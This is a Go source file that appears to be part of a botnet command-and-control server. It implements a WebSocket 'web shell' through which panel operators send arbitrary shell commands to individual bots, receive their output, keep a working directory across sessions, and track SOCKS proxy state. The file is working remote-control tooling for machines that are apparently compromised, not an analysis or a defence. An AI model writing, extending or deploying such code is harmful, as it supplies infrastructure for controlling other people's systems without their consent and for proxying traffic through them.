package main

import (
	"encoding/json"
	"net/http"
	"strings"
	"sync"

	"github.com/gorilla/websocket"
)

// ============================================================================
// WEB SHELL WEBSOCKET
// Provides real-time bidirectional shell access to bots via WebSocket.
// Web panel users click a bot row to open a terminal modal that connects here.
// ============================================================================

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		// Only allow same-origin WebSocket connections
		origin := r.Header.Get("Origin")
		if origin == "" {
			return true // non-browser clients (curl, etc.) don't send Origin
		}
		host := r.Host
		// Accept if origin matches the request host
		return strings.HasSuffix(origin, "://"+host)
	},
}

// safeWS wraps a websocket.Conn with a mutex for write serialization.
// gorilla/websocket requires that concurrent writes are serialized.
type safeWS struct {
	conn *websocket.Conn
	mu   sync.Mutex
}

func (s *safeWS) writeJSON(v interface{}) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.conn.WriteJSON(v)
}

var (
	webShellConns     = make(map[string][]*safeWS)
	webShellConnsLock sync.RWMutex

	// webShellCwd tracks the working directory per bot for web shell sessions.
	webShellCwd     = make(map[string]string)
	webShellCwdLock sync.RWMutex

	// webShellPendingCd tracks bots that have a cd+pwd in flight.
	// When the next output arrives and is an absolute path, update cwd.
	webShellPendingCd     = make(map[string]bool)
	webShellPendingCdLock sync.Mutex
)

func registerWebShell(botID string, ws *safeWS) {
	webShellConnsLock.Lock()
	defer webShellConnsLock.Unlock()
	webShellConns[botID] = append(webShellConns[botID], ws)
}

func unregisterWebShell(botID string, ws *safeWS) {
	webShellConnsLock.Lock()
	defer webShellConnsLock.Unlock()
	conns := webShellConns[botID]
	for i, c := range conns {
		if c == ws {
			webShellConns[botID] = append(conns[:i], conns[i+1:]...)
			break
		}
	}
	if len(webShellConns[botID]) == 0 {
		delete(webShellConns, botID)
	}
}

// forwardBotOutputToWebShells sends output to all web shell connections for a bot.
// No-ops when no connections exist (zero overhead when unused).
func forwardBotOutputToWebShells(botID, output string) {
	// If a cd+pwd is pending, capture the resolved path to update cwd
	webShellPendingCdLock.Lock()
	pending := webShellPendingCd[botID]
	if pending {
		delete(webShellPendingCd, botID)
	}
	webShellPendingCdLock.Unlock()
	if pending {
		resolved := strings.TrimSpace(output)
		if strings.HasPrefix(resolved, "/") && !strings.Contains(resolved, "\n") {
			webShellCwdLock.Lock()
			webShellCwd[botID] = resolved
			webShellCwdLock.Unlock()
		}
	}

	webShellConnsLock.RLock()
	conns := webShellConns[botID]
	if len(conns) == 0 {
		webShellConnsLock.RUnlock()
		return
	}
	// Copy slice under read lock
	snapshot := make([]*safeWS, len(conns))
	copy(snapshot, conns)
	webShellConnsLock.RUnlock()

	msg := map[string]string{
		"type":   "output",
		"botID":  botID,
		"output": output,
	}

	var dead []*safeWS
	for _, ws := range snapshot {
		if err := ws.writeJSON(msg); err != nil {
			dead = append(dead, ws)
		}
	}

	// Remove dead connections
	for _, ws := range dead {
		unregisterWebShell(botID, ws)
		ws.conn.Close()
	}
}

// handleWebShellWS is the WebSocket endpoint for the remote shell modal.
// Auth enforced by requireWebAuth middleware in NewWebMux.
func handleWebShellWS(w http.ResponseWriter, r *http.Request) {
	botID := strings.TrimSpace(r.URL.Query().Get("botID"))
	if botID == "" {
		http.Error(w, "Missing botID", http.StatusBadRequest)
		return
	}

	// Resolve full bot ID (supports prefix matching)
	bot := findBotByID(botID)
	if bot == nil {
		http.Error(w, "Bot not found", http.StatusNotFound)
		return
	}
	botID = bot.botID

	wsConn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}

	ws := &safeWS{conn: wsConn}
	registerWebShell(botID, ws)
	// Reset cwd for fresh shell session
	webShellCwdLock.Lock()
	delete(webShellCwd, botID)
	webShellCwdLock.Unlock()
	defer func() {
		unregisterWebShell(botID, ws)
		wsConn.Close()
	}()

	// Read loop: receive commands from the web shell
	for {
		_, msgBytes, err := wsConn.ReadMessage()
		if err != nil {
			break
		}

		var msg struct {
			Command string `json:"command"`
		}
		if err := json.Unmarshal(msgBytes, &msg); err != nil {
			continue
		}

		cmd := strings.TrimSpace(msg.Command)
		if cmd == "" {
			continue
		}

		// Auto-prefix with !shell for non-! commands (mirrors TUI behavior)
		if !strings.HasPrefix(cmd, "!") {
			// Track cd commands to maintain working directory across stateless shells
			if strings.HasPrefix(cmd, "cd ") || cmd == "cd" {
				dir := strings.TrimSpace(strings.TrimPrefix(cmd, "cd"))
				if dir == "" || dir == "~" {
					dir = "$HOME"
				}
				// Build the cd command with current cwd context
				webShellCwdLock.RLock()
				cur := webShellCwd[botID]
				webShellCwdLock.RUnlock()
				// Let the shell resolve the real path via pwd, don't do string concat
				var cdCmd string
				if cur != "" {
					cdCmd = "cd " + shellQuote(cur) + " && cd " + shellQuote(dir) + " && pwd"
				} else {
					cdCmd = "cd " + shellQuote(dir) + " && pwd"
				}
				cmd = "!shell " + cdCmd
				// Mark that we're waiting for pwd output to update cwd
				webShellPendingCdLock.Lock()
				webShellPendingCd[botID] = true
				webShellPendingCdLock.Unlock()
			} else {
				// Prepend cd to tracked cwd for stateless shell
				webShellCwdLock.RLock()
				cwd := webShellCwd[botID]
				webShellCwdLock.RUnlock()
				if cwd != "" {
					cmd = "!shell cd " + shellQuote(cwd) + " && " + cmd
				} else {
					cmd = "!shell " + cmd
				}
			}
		}

		sendToSingleBot(botID, cmd)
		trackSocksState(cmd, botID)
	}
}

// shellQuote wraps a path in single quotes for safe shell interpolation.
// $HOME is left unquoted so the shell expands it.
func shellQuote(s string) string {
	if s == "$HOME" {
		return s
	}
	return "'" + strings.ReplaceAll(s, "'", "'\"'\"'") + "'"
}
